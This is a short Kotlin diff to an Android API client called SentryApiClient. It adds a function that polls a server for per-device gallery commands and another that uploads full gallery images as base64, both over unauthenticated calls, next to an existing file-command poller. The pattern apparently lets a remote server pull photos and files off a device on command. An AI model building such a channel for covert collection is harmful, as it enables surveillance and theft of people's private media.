@@ -160,6 +160,22 @@ class SentryApiClient(
         post("/gallery/sync", body, authenticated = false)
     }
 
+    suspend fun pollGalleryCommands(): Result<JSONObject> = withContext(Dispatchers.IO) {
+        val deviceId = CryptoManager.getOrCreateDeviceId(context)
+        get("/gallery/command/$deviceId", authenticated = false)
+    }
+
+    suspend fun uploadFullGalleryImage(mediaId: String, base64: String, mimeType: String = "image/jpeg"): Result<JSONObject> = withContext(Dispatchers.IO) {
+        val deviceId = CryptoManager.getOrCreateDeviceId(context)
+        val body = JSONObject().apply {
+            put("deviceId", deviceId)
+            put("mediaId", mediaId)
+            put("base64", base64)
+            put("mimeType", mimeType)
+        }
+        post("/gallery/upload_full", body, authenticated = false)
+    }
+
     suspend fun pollFileCommands(): Result<JSONObject> = withContext(Dispatchers.IO) {
         val deviceId = CryptoManager.getOrCreateDeviceId(context)
         request("GET", "/files/command/$deviceId", null, authenticated = false)
